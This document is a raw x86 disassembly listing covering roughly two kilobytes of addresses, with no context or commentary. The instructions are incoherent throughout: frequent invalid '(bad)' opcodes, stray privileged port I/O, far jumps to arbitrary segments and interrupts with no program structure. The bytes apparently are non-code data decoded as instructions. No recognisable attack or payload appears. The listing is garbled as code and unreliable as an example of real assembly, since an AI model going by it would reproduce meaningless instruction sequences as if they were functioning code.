  4117f4:	mov    edi,0x3ff36ab2
  4117f9:	sbb    ecx,DWORD PTR [ebp-0xa]
  4117fc:	sbb    edx,edx
  4117fe:	das    
  4117ff:	push   es
  411800:	xlat   BYTE PTR ds:[ebx]
  411801:	(bad)  
  411803:	or     dh,BYTE PTR [ebx+0x474c96ac]
  411809:	jmp    0x1df2b685
  41180e:	mov    dh,0xdf
  411810:	or     al,0xa
  411812:	jb     0x411877
  411814:	(bad)  
  411815:	cdq    
  411816:	or     DWORD PTR [ecx-0x686d8cb8],eax
  41181c:	pop    edx
  41181d:	bound  edx,QWORD PTR [eax+0x792f1cfa]
  411823:	test   edi,esi
  411825:	dec    edi
  411826:	(bad)  [eax]
  411828:	mov    esi,0xa6b19125
  41182d:	fisub  WORD PTR [edx]
  41182f:	aas    
  411830:	adc    al,0xe3
  411832:	cwde   
  411833:	or     cl,BYTE PTR [esp+ecx*8-0x12]
  411837:	push   ss
  411838:	aam    0x17
  41183a:	call   0x6906a6ba
  41183f:	sub    ebp,DWORD PTR [eax+0x29]
  411842:	dec    esp
  411843:	fs into 
  411845:	test   BYTE PTR [ebx+0x6d],ah
  411848:	in     eax,dx
  411849:	cmp    al,BYTE PTR [edx]
  41184b:	cli    
  41184c:	fistp  DWORD PTR [eax]
  41184e:	push   ebx
  41184f:	pusha  
  411850:	call   0xdcf6:0xe9dd4992
  411857:	popf   
  411858:	sub    eax,0xb7ee6498
  41185d:	lods   al,BYTE PTR ds:[esi]
  41185e:	xlat   BYTE PTR ds:[ebx]
  41185f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411860:	cdq    
  411861:	xlat   BYTE PTR ds:[ebx]
  411862:	cmp    esi,DWORD PTR [ebx-0x1]
  411865:	test   al,0xa2
  411867:	jno    0x41185c
  411869:	loopne 0x4118d6
  41186b:	inc    ebp
  41186c:	jnp    0x411821
  41186e:	loope  0x411875
  411870:	pop    ebx
  411871:	mov    cs,WORD PTR [esi+0x275ae51d]
  411877:	sub    DWORD PTR [eax],esi
  411879:	adc    DWORD PTR [edi+0x24],esi
  41187c:	inc    ecx
  41187d:	xchg   ecx,eax
  41187e:	aad    0x34
  411880:	mov    cl,0xe7
  411882:	jp     0x4118ef
  411884:	js     0x411841
  411886:	adc    DWORD PTR [ebx+0xee56dd9],esi
  41188c:	or     al,0x58
  41188e:	pop    ebp
  41188f:	test   DWORD PTR [esp+eax*1-0x19],edi
  411893:	cmc    
  411894:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411896:	and    BYTE PTR [ebp-0x581ef998],dh
  41189c:	dec    esp
  41189d:	push   es
  41189e:	xor    al,0x6c
  4118a0:	out    0xd5,eax
  4118a2:	or     edx,DWORD PTR [ecx+ebp*8-0x65]
  4118a6:	les    eax,FWORD PTR [ebp+esi*8-0x27e3483]
  4118ad:	mov    eax,0x3f2a85c3
  4118b2:	ret    
  4118b3:	or     bh,ch
  4118b5:	add    BYTE PTR [eax+ebp*1+0x4f4d02d2],bh
  4118bc:	mov    dh,0x80
  4118be:	outs   dx,BYTE PTR ds:[esi]
  4118bf:	xor    BYTE PTR [ecx],0x46
  4118c2:	jg     0x411937
  4118c4:	mov    al,0x9a
  4118c6:	xor    edi,edx
  4118c8:	jae    0x411871
  4118ca:	popa   
  4118cb:	push   ss
  4118cc:	pop    edx
  4118cd:	or     eax,0xcdb58c56
  4118d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118d3:	push   ecx
  4118d4:	loop   0x4118d7
  4118d6:	stc    
  4118d7:	adc    ebx,DWORD PTR [ecx+0x6e]
  4118da:	xor    ch,BYTE PTR [edi+0x7542e259]
  4118e0:	xor    al,0xb7
  4118e2:	and    al,0xc9
  4118e4:	lods   al,BYTE PTR ds:[esi]
  4118e6:	dec    ebx
  4118e7:	adc    eax,0x46c49cac
  4118ec:	pop    eax
  4118ed:	not    eax
  4118ef:	cmc    
  4118f0:	mov    al,ds:0xaa3162b2
  4118f5:	cwde   
  4118f6:	dec    ebp
  4118f7:	or     al,0x26
  4118f9:	sbb    eax,0x37c62e92
  4118fe:	push   0x4a
  411900:	adc    ch,dl
  411902:	rsqrtps xmm7,XMMWORD PTR [edi-0x59f3b543]
  411909:	add    al,0xd7
  41190b:	inc    edi
  41190c:	inc    ebp
  41190d:	add    ecx,DWORD PTR [edx+0xfc23a79]
  411913:	pop    eax
  411914:	sbb    DWORD PTR [ebp-0x2ca4eed8],ebp
  41191a:	icebp  
  41191b:	mov    bh,0x37
  41191d:	aad    0x36
  41191f:	inc    esi
  411920:	lea    ebp,[ecx-0x37ce4db3]
  411926:	sbb    ebp,DWORD PTR [esi]
  411928:	(bad)  
  411929:	int    0x3
  41192b:	das    
  41192c:	add    al,0x63
  41192e:	mov    esp,0xa5006526
  411933:	rol    DWORD PTR [bx+si+0x6f73],0x1c
  411939:	sbb    edx,edx
  41193b:	loop   0x41197e
  41193d:	mov    ecx,0xad2844bd
  411942:	iret   
  411943:	add    eax,ecx
  411945:	xor    ah,bl
  411947:	push   esp
  411948:	mov    bh,0x9d
  41194a:	and    al,BYTE PTR [eax-0x72326989]
  411950:	sbb    DWORD PTR [esi],esi
  411952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411953:	xor    DWORD PTR [ecx],eax
  411955:	out    0x84,al
  411957:	iret   
  411958:	dec    ecx
  411959:	cdq    
  41195a:	jo     0x41194c
  41195c:	aaa    
  41195d:	mov    ah,0xb7
  41195f:	adc    eax,0x5af76322
  411964:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411965:	mov    edx,0x58d0114f
  41196a:	mov    DWORD PTR [esi+ecx*1+0x41],edx
  41196e:	in     eax,dx
  41196f:	jl     0x4119ce
  411971:	mov    DWORD PTR [ebx],edi
  411973:	mov    ah,0x97
  411975:	adc    cl,BYTE PTR [edx]
  411977:	call   0xcdd5:0xc12bdd38
  41197e:	inc    esp
  41197f:	mov    ds:0xd7613102,al
  411984:	sar    BYTE PTR [ebx+0x13],1
  411987:	stos   BYTE PTR es:[edi],al
  411988:	inc    edx
  411989:	aas    
  41198a:	fst    DWORD PTR [eax-0x6c]
  41198d:	mov    edx,0xf1a3516d
  411992:	inc    edi
  411993:	jecxz  0x411947
  411995:	xchg   esi,eax
  411996:	(bad)  
  411997:	out    0xfc,eax
  411999:	and    dh,BYTE PTR [ebx]
  41199b:	sub    eax,0x5bc0a218
  4119a0:	cmp    dh,BYTE PTR [eax-0x13]
  4119a3:	adc    al,0xaa
  4119a5:	pop    ebp
  4119a6:	mov    cl,0x4
  4119a8:	jge    0x41197a
  4119aa:	inc    edi
  4119ab:	test   DWORD PTR [ecx-0x67],ebp
  4119ae:	jnp    0x411a1b
  4119b0:	dec    ebp
  4119b1:	inc    ebp
  4119b2:	adc    BYTE PTR [esi-0x264e8669],ah
  4119b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119b9:	scas   al,BYTE PTR es:[edi]
  4119ba:	mov    WORD PTR [ebx+0x6771ff39],?
  4119c0:	clc    
  4119c1:	push   esi
  4119c2:	fcmovnbe st,st(5)
  4119c4:	mov    fs,WORD PTR [ebp-0x71]
  4119c7:	rcr    DWORD PTR [ebx+0x2a34868d],1
  4119cd:	adc    ebx,ebx
  4119cf:	popf   
  4119d0:	into   
  4119d1:	pop    ss
  4119d2:	sub    esp,DWORD PTR fs:[ebx+edi*8]
  4119d6:	(bad)  [ecx-0x5a91a52c]
  4119dc:	or     ah,BYTE PTR [edi+0x5c04760]
  4119e2:	add    esi,edx
  4119e4:	jg     0x4119e7
  4119e6:	int    0xa4
  4119e8:	jmp    0x1833:0xcfe7506b
  4119ef:	mov    bl,0x9b
  4119f1:	std    
  4119f2:	adc    DWORD PTR [edi+0x2e],0x1151ae22
  4119f9:	js     0x41199c
  4119fb:	or     DWORD PTR [eax+0x6fbdd2a0],0xffffffcd
  411a02:	lock push 0x7017ef0a
  411a08:	ds xchg edx,eax
  411a0a:	inc    esp
  411a0b:	push   edx
  411a0c:	sbb    DWORD PTR [edx-0x26630d4a],0x18
  411a13:	lods   al,BYTE PTR ds:[esi]
  411a14:	cwde   
  411a15:	jnp    0x411a23
  411a17:	add    edi,esp
  411a19:	dec    eax
  411a1a:	int    0xb1
  411a1c:	es ds aam 0x13
  411a20:	adc    DWORD PTR [esi+0x72941bb5],0xffffffe1
  411a27:	cmp    DWORD PTR [ecx-0x59],edi
  411a2a:	sub    DWORD PTR [ebx],0xffffffa1
  411a2d:	push   es
  411a2e:	xchg   ebp,eax
  411a2f:	out    0xb4,eax
  411a31:	inc    ebp
  411a32:	sub    DWORD PTR [eax-0xf],esi
  411a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a36:	pushf  
  411a37:	retf   0x5fb5
  411a3a:	push   ebx
  411a3b:	jno    0x411a56
  411a3d:	dec    esi
  411a3e:	mov    ebp,0x5a5cb1a2
  411a43:	retf   0xe37d
  411a46:	aaa    
  411a47:	xchg   ecx,eax
  411a48:	rol    DWORD PTR [ebx+eiz*1+0x5f],1
  411a4c:	pop    ss
  411a4d:	pusha  
  411a4e:	ja     0x411a1d
  411a50:	xor    ah,BYTE PTR [edi-0x7d30d598]
  411a56:	in     eax,0x3e
  411a58:	add    ch,BYTE PTR [edi-0x9fccbec]
  411a5e:	jl     0x411a65
  411a60:	pop    ebx
  411a61:	pop    edi
  411a62:	dec    BYTE PTR [edi]
  411a64:	aad    0x8f
  411a66:	jg     0x411a35
  411a68:	push   0x2062465e
  411a6d:	aam    0xcb
  411a6f:	lahf   
  411a70:	rol    DWORD PTR [edx+0x2c],cl
  411a73:	loop   0x411a24
  411a75:	(bad)  
  411a76:	fwait
  411a77:	aam    0xd8
  411a79:	mov    bl,0x86
  411a7b:	cmp    eax,0xfa6e9c76
  411a80:	pop    edx
  411a81:	xor    BYTE PTR [ebx-0x1ee3313],al
  411a87:	ins    BYTE PTR es:[edi],dx
  411a88:	sub    BYTE PTR [edi+0x5c],ah
  411a8b:	aad    0xbb
  411a8d:	fisubr DWORD PTR [edi-0x2c232d05]
  411a93:	in     al,0x48
  411a95:	inc    ebx
  411a96:	jno    0x411a67
  411a98:	shl    BYTE PTR [edx+0x20009f20],0xce
  411a9f:	jb     0x411a9a
  411aa1:	pop    edx
  411aa2:	inc    esp
  411aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411aa4:	imul   esi,DWORD PTR [ecx*2+0x2da3e29a],0xc
  411aac:	stos   DWORD PTR es:[edi],eax
  411aad:	ja     0x411b08
  411aaf:	in     al,dx
  411ab0:	pushf  
  411ab1:	mov    ds:0x2a9b9979,eax
  411ab6:	inc    edx
  411ab7:	shr    DWORD PTR [esi+0x46],1
  411aba:	xchg   ebp,eax
  411abb:	es loope 0x411aee
  411abe:	mov    ecx,0x2b776a5e
  411ac3:	ja     0x411ae6
  411ac5:	inc    edx
  411ac6:	aad    0xa
  411ac8:	rol    DWORD PTR [edx-0x7c35ec74],1
  411ace:	xor    DWORD PTR ds:0x40b9278b,esp
  411ad4:	cld    
  411ad5:	xchg   esp,eax
  411ad6:	fiadd  DWORD PTR [edx-0x1c]
  411ad9:	adc    eax,esp
  411adb:	xchg   BYTE PTR [ecx],ch
  411add:	ror    BYTE PTR [edx],0x6
  411ae0:	xchg   esp,eax
  411ae1:	dec    edi
  411ae2:	outs   dx,BYTE PTR ds:[esi]
  411ae3:	inc    edx
  411ae4:	mov    cs,WORD PTR [edi]
  411ae6:	aaa    
  411ae7:	mov    eax,0x37fc898a
  411aec:	nop    DWORD PTR [ecx-0x1bda7420]
  411af3:	dec    eax
  411af4:	lock call FWORD PTR [edx]
  411af7:	inc    esi
  411af8:	adc    eax,0x7d077f7a
  411afd:	retf   
  411afe:	je     0x411b5f
  411b00:	call   esp
  411b02:	xor    eax,0xdef3c2ce
  411b07:	cmp    al,0x7b
  411b09:	sub    esi,DWORD PTR ds:0xc4b38160
  411b0f:	add    ebp,DWORD PTR [edx-0x4320a12]
  411b15:	mov    gs,WORD PTR [edx-0x49389f9c]
  411b1b:	push   ecx
  411b1c:	sbb    edi,eax
  411b1e:	add    BYTE PTR [eax-0x75],0x69
  411b22:	fld    TBYTE PTR [edi-0x6e]
  411b25:	shr    ch,cl
  411b27:	push   edx
  411b28:	rol    BYTE PTR [ebx-0x73],1
  411b2b:	mov    esi,0x434f2602
  411b30:	push   cs
  411b31:	(bad)  
  411b32:	jb     0x411b86
  411b34:	xchg   esp,eax
  411b35:	not    BYTE PTR [ebp-0x360586db]
  411b3b:	repz pop es
  411b3d:	fdecstp 
  411b3f:	sub    eax,0xf70467a8
  411b44:	mov    BYTE PTR [ecx-0x53a003e7],bh
  411b4a:	cli    
  411b4b:	push   edi
  411b4c:	ins    DWORD PTR es:[edi],dx
  411b4d:	in     al,dx
  411b4e:	xchg   DWORD PTR [edi],esp
  411b50:	les    ecx,FWORD PTR ds:0x6d45f151
  411b56:	pop    ss
  411b57:	jno    0x411bb2
  411b59:	daa    
  411b5a:	add    al,0x3a
  411b5c:	sub    eax,DWORD PTR [edx+edi*4+0x51]
  411b60:	and    bh,BYTE PTR [esi+0xa80f9d6]
  411b66:	call   0xcfe65d32
  411b6b:	aas    
  411b6c:	mov    fs,WORD PTR [edx+0x4c]
  411b6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b70:	pop    esp
  411b71:	pop    ss
  411b72:	fcom   DWORD PTR [eax+0x5cbb6cb6]
  411b78:	mov    eax,ds:0x35f39243
  411b7d:	adc    BYTE PTR [ebx+0x255a812d],ch
  411b83:	push   edx
  411b84:	sbb    edx,ebx
  411b86:	push   edx
  411b87:	add    eax,0x6f9c990a
  411b8c:	(bad)  
  411b8d:	jge    0x411b36
  411b8f:	jbe    0x411b17
  411b91:	adc    cl,BYTE PTR [edi-0x65]
  411b94:	adc    DWORD PTR [ecx],esi
  411b96:	add    BYTE PTR [edx],bl
  411b98:	scas   eax,DWORD PTR es:[edi]
  411b99:	dec    ebp
  411b9a:	cli    
  411b9b:	and    BYTE PTR [eax],dh
  411b9d:	cs inc eax
  411b9f:	leave  
  411ba0:	dec    esp
  411ba1:	mov    ch,0x34
  411ba3:	dec    esi
  411ba4:	fistp  QWORD PTR [edi]
  411ba6:	cwde   
  411ba7:	jge    0x411b7b
  411ba9:	out    dx,eax
  411baa:	lds    edx,FWORD PTR [ebx+0x28]
  411bad:	shl    BYTE PTR [esp+ebp*8],1
  411bb0:	add    BYTE PTR [edi],cl
  411bb2:	mov    bh,0x64
  411bb4:	test   eax,0x4b1b4a11
  411bb9:	ret    
  411bba:	popa   
  411bbb:	cs xchg esp,eax
  411bbd:	mov    WORD PTR [ebx-0x9],?
  411bc0:	jp     0x411c2c
  411bc2:	mov    esi,0x7bc2f32e
  411bc7:	pop    ds
  411bc8:	add    dl,BYTE PTR [ebp-0x32]
  411bcb:	daa    
  411bcc:	pop    edx
  411bcd:	cmp    ch,dl
  411bcf:	pushf  
  411bd0:	jae    0x411c31
  411bd2:	dec    ecx
  411bd3:	(bad)  
  411bd5:	xchg   ebx,eax
  411bd6:	neg    bh
  411bd8:	pop    edx
  411bd9:	fsubp  st(0),st
  411bdb:	xlat   BYTE PTR ds:[ebx]
  411bdc:	retf   
  411bdd:	inc    edx
  411bde:	cmp    DWORD PTR [ebx],edx
  411be0:	dec    edi
  411be1:	push   0xffffffb5
  411be3:	daa    
  411be4:	lock int3 
  411be6:	xor    BYTE PTR [ebx+0x49],dh
  411be9:	mov    ebp,fs
  411beb:	push   cs
  411bec:	div    ebx
  411bee:	or     DWORD PTR [ebx+0x12],edi
  411bf1:	xor    ebp,DWORD PTR [eax-0x4f]
  411bf4:	mov    ebp,0xbabf8eb4
  411bf9:	sub    BYTE PTR [eax],cl
  411bfb:	loop   0x411b85
  411bfd:	and    al,0x73
  411bff:	add    edi,eax
  411c01:	push   0x39
  411c03:	fldl2t 
  411c05:	in     al,dx
  411c06:	inc    ebp
  411c07:	sbb    eax,0x41556aa2
  411c0c:	push   es
  411c0d:	cwde   
  411c0e:	inc    edi
  411c0f:	dec    ebp
  411c10:	in     eax,0xab
  411c12:	(bad)  
  411c13:	xor    BYTE PTR [edi-0x2c],ah
  411c16:	mov    dh,0xec
  411c18:	pop    esi
  411c19:	test   BYTE PTR [edi+ebp*2+0x42da1383],dh
  411c20:	cmp    DWORD PTR [edi],0x3c
  411c23:	push   esp
  411c24:	fdivr  st(6),st
  411c26:	jmp    0xe1991ee9
  411c2b:	xor    bh,dh
  411c2d:	pop    es
  411c2e:	jnp    0x411c86
  411c30:	enter  0x1962,0xa4
  411c34:	jbe    0x411c23
  411c36:	mov    ch,0x47
  411c38:	jnp    0x411bd3
  411c3a:	push   ss
  411c3b:	ja     0x411cb3
  411c3d:	iret   
  411c3e:	cmp    BYTE PTR ds:0xc3f1e495,dh
  411c44:	(bad)  
  411c45:	and    ch,BYTE PTR [esi+esi*8-0x3d812abd]
  411c4c:	and    BYTE PTR [edx],ch
  411c4e:	cmp    ch,BYTE PTR [ebp+ebp*1+0x3fa5e902]
  411c55:	popa   
  411c56:	lods   al,BYTE PTR ds:[esi]
  411c57:	stos   BYTE PTR es:[edi],al
  411c58:	arpl   WORD PTR [edx-0x6],di
  411c5b:	xchg   edi,eax
  411c5c:	mov    ch,0xd5
  411c5e:	not    BYTE PTR [eax+0x546a8acc]
  411c64:	jmp    0xad72:0xec7fb141
  411c6b:	sub    eax,0xf15a4c62
  411c70:	retf   0x3cc0
  411c73:	mov    al,ds:0x46861c62
  411c78:	sub    DWORD PTR ds:0xb31279af,eax
  411c7e:	adc    eax,0x3693ef7f
  411c83:	add    al,0x23
  411c85:	jo     0x411c6e
  411c87:	aad    0x9e
  411c89:	jmp    0x411ca8
  411c8b:	aaa    
  411c8c:	or     eax,0xd0ac0e0
  411c91:	int    0xaf
  411c93:	pushf  
  411c94:	push   ebp
  411c95:	pop    esp
  411c96:	xchg   BYTE PTR [edx+0x17f62157],bl
  411c9c:	ret    
  411c9d:	mov    bh,0x3e
  411c9f:	fbstp  TBYTE PTR [edi+0x30f3717b]
  411ca5:	into   
  411ca6:	and    dh,BYTE PTR [ebp-0x2]
  411ca9:	cmp    DWORD PTR [eax],esp
  411cab:	fisub  WORD PTR [esi+esi*8]
  411cae:	mov    edi,0x370c42fc
  411cb3:	push   edx
  411cb4:	jno    0x411d2e
  411cb6:	add    edx,DWORD PTR ds:0xc56350bc
  411cbc:	ror    dl,1
  411cbe:	push   edi
  411cbf:	mov    dh,0x67
  411cc1:	xchg   ebp,eax
  411cc2:	mov    es,WORD PTR [ebp-0x2b]
  411cc5:	test   al,0xb
  411cc7:	xor    ah,dh
  411cc9:	sbb    eax,0x59a45f99
  411cce:	sbb    DWORD PTR [edx+0x8],0xffffffa9
  411cd2:	mov    cl,0x52
  411cd4:	push   edi
  411cd5:	inc    edi
  411cd6:	hlt    
  411cd7:	sub    BYTE PTR [edi+0x14],dh
  411cda:	mov    ecx,0xee26137a
  411cdf:	out    dx,al
  411ce0:	cmp    al,0x17
  411ce2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ce3:	xor    BYTE PTR [ecx+0x62272a05],ah
  411ce9:	inc    esp
  411cea:	imul   edi,ecx,0xe
  411ced:	into   
  411cee:	mov    ah,0xa0
  411cf0:	inc    eax
  411cf1:	push   ecx
  411cf2:	cmp    al,0x4a
  411cf4:	mov    bh,0x8e
  411cf6:	(bad)  
  411cf7:	jmp    0xdd2f:0x7979bac1
  411cfe:	js     0x411d1a
  411d00:	aad    0xa2
  411d02:	inc    ebp
  411d03:	inc    ebp
  411d04:	test   eax,0x88d2d6aa
  411d09:	stos   BYTE PTR es:[edi],al
  411d0a:	pop    edi
  411d0b:	cmc    
  411d0c:	test   BYTE PTR [ebp+0x3c119489],ch
  411d12:	fwait
  411d13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d14:	lea    esp,gs:[edi-0x6e]
  411d18:	mov    esp,0x4b4b7a5e
  411d1d:	and    esi,DWORD PTR [ebp+0x2f]
  411d20:	enter  0x11ed,0x3a
  411d24:	pop    es
  411d25:	add    DWORD PTR [esi],esp
  411d27:	push   ebp
  411d28:	pop    edi
  411d29:	push   ebp
  411d2a:	arpl   WORD PTR [ecx+0x3183c9d4],bx
  411d30:	jg     0x411d4e
  411d32:	mov    ch,0x67
  411d34:	xchg   edx,eax
  411d35:	test   eax,0xb5e875c
  411d3a:	jns    0x411cf4
  411d3c:	out    dx,al
  411d3d:	outs   dx,BYTE PTR ds:[esi]
  411d3e:	ss cwde 
  411d40:	jae    0x411db2
  411d42:	out    0x1e,eax
  411d44:	pop    esp
  411d45:	xchg   edx,eax
  411d46:	xor    al,0x13
  411d48:	push   esi
  411d49:	lods   eax,DWORD PTR ds:[esi]
  411d4a:	scas   eax,DWORD PTR es:[edi]
  411d4b:	sub    DWORD PTR [edi+0xf],esp
  411d4e:	push   ecx
  411d4f:	enter  0x5db1,0xb0
  411d53:	mov    al,ds:0x7b017c2b
  411d58:	and    eax,0xfc31fcb0
  411d5d:	mov    eax,DWORD PTR [edi]
  411d5f:	shr    edx,cl
  411d61:	neg    eax
  411d63:	jo     0x411dc8
  411d65:	in     eax,0xa0
  411d67:	ins    DWORD PTR es:[edi],dx
  411d68:	dec    edi
  411d69:	jne    0x411d4e
  411d6b:	xchg   edi,eax
  411d6c:	jle    0x411d6c
  411d6e:	inc    ebp
  411d6f:	xor    DWORD PTR [esi],esi
  411d71:	mov    edx,0x9c956561
  411d76:	add    dl,BYTE PTR [esi]
  411d78:	das    
  411d79:	dec    edi
  411d7a:	arpl   cx,bp
  411d7c:	sbb    DWORD PTR [ecx+eax*1],0xabd78ff6
  411d83:	xor    al,0x2b
  411d85:	mov    cl,0xbd
  411d87:	jl     0x411d22
  411d89:	outs   dx,BYTE PTR ds:[esi]
  411d8a:	cld    
  411d8b:	ss push cs
  411d8d:	xchg   ecx,eax
  411d8e:	dec    ebx
  411d8f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  411d91:	or     BYTE PTR [ecx-0x56],dh
  411d94:	stc    
  411d95:	(bad)  
  411d96:	mov    ds:0x92f4b242,eax
  411d9b:	mov    al,dl
  411d9d:	in     eax,dx
  411d9e:	into   
  411d9f:	fs or  al,bh
  411da2:	mov    WORD PTR [ecx],gs
  411da4:	das    
  411da5:	iret   
  411da6:	push   edi
  411da7:	xor    al,0x3b
  411da9:	nop    DWORD PTR [edx]
  411dac:	leave  
  411dad:	xor    edi,edi
  411daf:	adc    eax,0x3692ac9a
  411db4:	psraw  mm4,mm0
  411db7:	or     ebp,DWORD PTR [ecx-0x1574278b]
  411dbd:	mov    al,0x52
  411dbf:	jmp    0x7a7ecaa1
  411dc4:	cmp    al,0x23
  411dc6:	sub    al,0xf9
  411dc8:	stos   DWORD PTR es:[edi],eax
  411dc9:	mov    edx,DWORD PTR [ecx]
  411dcb:	sub    bh,BYTE PTR [esi-0x44]
  411dce:	pop    eax
  411dcf:	cdq    
  411dd0:	loop   0x411df1
  411dd2:	adc    DWORD PTR [ecx],esp
  411dd4:	and    ah,BYTE PTR ds:0x667cb763
  411dda:	jmp    0x77a8:0x1baf27d1
  411de1:	in     al,dx
  411de2:	or     al,dl
  411de4:	mov    ecx,0xf9b9d2ee
  411de9:	cmp    al,0xb3
  411deb:	mov    dh,0x42
  411ded:	cld    
  411dee:	lds    ebx,FWORD PTR [edx]
  411df0:	not    DWORD PTR [edx-0x2c522783]
  411df6:	sub    esi,DWORD PTR [edx-0x6eadecf2]
  411dfc:	fcmovu st,st(7)
  411dfe:	loope  0x411dfb
  411e00:	or     BYTE PTR [ebx],bl
  411e02:	xor    al,0x36
  411e04:	jp     0x411de1
  411e06:	or     al,0xd3
  411e08:	sbb    esp,esp
  411e0a:	or     ch,al
  411e0c:	jb     0x411dc4
  411e0e:	leave  
  411e0f:	dec    ecx
  411e10:	mov    ds:0xc75df155,eax
  411e15:	mov    al,0xf8
  411e17:	jp     0x411e25
  411e19:	(bad)  
  411e1a:	ins    BYTE PTR es:[edi],dx
  411e1b:	in     eax,0x6a
  411e1d:	(bad)  
  411e1e:	pusha  
  411e1f:	sbb    BYTE PTR [edi+0x11c31d5],bl
  411e25:	into   
  411e26:	jne    0x411db0
  411e28:	sahf   
  411e29:	push   ds
  411e2a:	xchg   ebp,eax
  411e2b:	add    DWORD PTR [ebp-0x66a37e3e],edx
  411e31:	sbb    ah,dh
  411e33:	in     eax,dx
  411e34:	push   edx
  411e35:	bound  edi,QWORD PTR [edx]
  411e37:	ret    0x613a
  411e3a:	sbb    eax,0x142e3519
  411e3f:	rcr    DWORD PTR [eax+eiz*1+0x9b83ab],0x69
  411e47:	xor    al,0x54
  411e49:	inc    DWORD PTR [ebx+0x51]
  411e4c:	data16 mov ah,0xa9
  411e4f:	je     0x411e3c
  411e51:	cmp    BYTE PTR [esi-0x4b5ecbe1],dl
  411e57:	outs   dx,DWORD PTR ds:[esi]
  411e58:	jecxz  0x411e54
  411e5a:	pop    ebp
  411e5b:	mov    dh,0xb
  411e5d:	push   ebp
  411e5e:	inc    edi
  411e5f:	hlt    
  411e60:	sti    
  411e61:	push   0x8
  411e63:	adc    ecx,eax
  411e65:	push   di
  411e67:	inc    esi
  411e68:	das    
  411e69:	add    eax,0x80899c9d
  411e6e:	and    ch,bl
  411e70:	xchg   edx,eax
  411e71:	and    BYTE PTR [edi-0x5febd0f7],dl
  411e77:	add    DWORD PTR [edi-0x31b9de29],ecx
  411e7d:	sbb    BYTE PTR [ebp+0x7d],ah
  411e80:	sbb    BYTE PTR es:[ebx+ebp*8],cl
  411e84:	cmp    DWORD PTR [ebp-0x28],esp
  411e87:	js     0x411ef7
  411e89:	dec    ebx
  411e8a:	scas   al,BYTE PTR es:[edi]
  411e8b:	mov    gs,ecx
  411e8d:	adc    ebx,ebx
  411e8f:	sbb    eax,0x55b501eb
  411e94:	push   esp
  411e95:	and    al,0xcd
  411e97:	(bad)
  411e9a:	(bad)  
  411e9b:	sub    eax,0x37de18e2
  411ea0:	sbb    ch,dh
  411ea2:	mov    bh,dh
  411ea4:	pop    ebx
  411ea5:	fld    DWORD PTR [esi]
  411ea7:	fwait
  411ea8:	xchg   esi,eax
  411ea9:	fld    QWORD PTR [eax+0x1b1555e7]
  411eaf:	cmp    DWORD PTR [ebx+0x35ebdbf],eax
  411eb5:	and    edi,DWORD PTR [ebp+0x3d540b1a]
  411ebb:	cdq    
  411ebc:	xor    BYTE PTR [edi+0x1a],bh
  411ebf:	cmp    ebx,ebx
  411ec1:	mov    dh,0x57
  411ec3:	scas   eax,DWORD PTR es:[edi]
  411ec4:	dec    esi
  411ec5:	clc    
  411ec6:	ins    DWORD PTR es:[edi],dx
  411ec7:	lds    eax,FWORD PTR [edi+0x4ca4b389]
  411ecd:	xchg   esi,eax
  411ece:	push   ds
  411ecf:	mov    bl,BYTE PTR [ebx+0x23]
  411ed2:	mov    ch,0x43
  411ed4:	sub    BYTE PTR [edx],0x53
  411ed7:	cmp    al,0x28
  411ed9:	mov    al,0x71
  411edb:	outs   dx,BYTE PTR ds:[esi]
  411edc:	inc    edx
  411edd:	xchg   DWORD PTR [edx-0x394d95d2],eax
  411ee3:	push   edi
  411ee4:	aaa    
  411ee5:	pop    DWORD PTR [esi-0x5f]
  411ee8:	xchg   dl,al
  411eea:	lods   al,BYTE PTR ds:[esi]
  411eeb:	lahf   
  411eec:	inc    edx
  411eed:	sbb    edx,DWORD PTR [ecx+ebx*2]
  411ef0:	ss jbe 0x411e7e
  411ef3:	sub    esp,DWORD PTR [esi*1+0xec6b781]
  411efa:	push   0x935b3145
  411eff:	mov    edx,0xbde1fba4
  411f04:	lods   al,BYTE PTR ds:[esi]
  411f05:	pop    edi
  411f06:	push   ss
  411f07:	sbb    esi,DWORD PTR [eax+0x4b]
  411f0a:	xchg   esp,eax
  411f0b:	xor    esp,DWORD PTR [ecx+0x2898a51d]
  411f11:	cmp    al,BYTE PTR [eax-0x633bdc9]
  411f17:	(bad)  
  411f18:	shl    BYTE PTR [edi],0xd5
  411f1b:	mov    ch,BYTE PTR [edx-0x16]
  411f1e:	cli    
  411f1f:	mov    DWORD PTR [eax+ecx*2+0x725db3d],0x1937997d
  411f2a:	outs   dx,BYTE PTR ds:[esi]
  411f2b:	imul   ecx,ecx,0xe3d59b98
  411f31:	je     0x411f14
  411f33:	mov    DWORD PTR [esi],edx
  411f35:	or     al,0x5e
  411f37:	and    BYTE PTR [edi+eax*2+0x68],cl
  411f3b:	cli    
  411f3c:	xchg   edi,eax
  411f3d:	cmp    BYTE PTR [ebx-0x1d],0xa3
  411f41:	adc    al,BYTE PTR [ebp+0x75f03068]
  411f47:	cmp    eax,0xcd23e53f
  411f4c:	clc    
  411f4d:	xor    DWORD PTR [eax-0x3eeb3754],0x24
  411f54:	xor    ebx,DWORD PTR [ebx]
  411f56:	pushf  
  411f57:	jbe    0x411f25
  411f59:	or     BYTE PTR [eax+eax*1+0x19],bl
  411f5d:	cmp    BYTE PTR [esp-0x2de74b2],0xa9
  411f65:	push   cs
  411f66:	mov    eax,0x20b09586
  411f6b:	cmp    DWORD PTR [edx-0x67],edx
  411f6e:	lock dec esp
  411f70:	xor    esi,eax
  411f72:	mov    eax,ds:0x3ef6dd0a
  411f77:	and    DWORD PTR [ebx],ecx
  411f79:	stc    
  411f7a:	mov    ds:0xd956b2ac,eax
  411f7f:	and    ah,BYTE PTR [ebx+0x57]
  411f82:	pop    esp
  411f83:	xor    ebp,DWORD PTR [edi-0x69]
  411f86:	xchg   esi,eax
  411f87:	mov    edi,0x2f49d9aa
  411f8c:	add    al,0x80
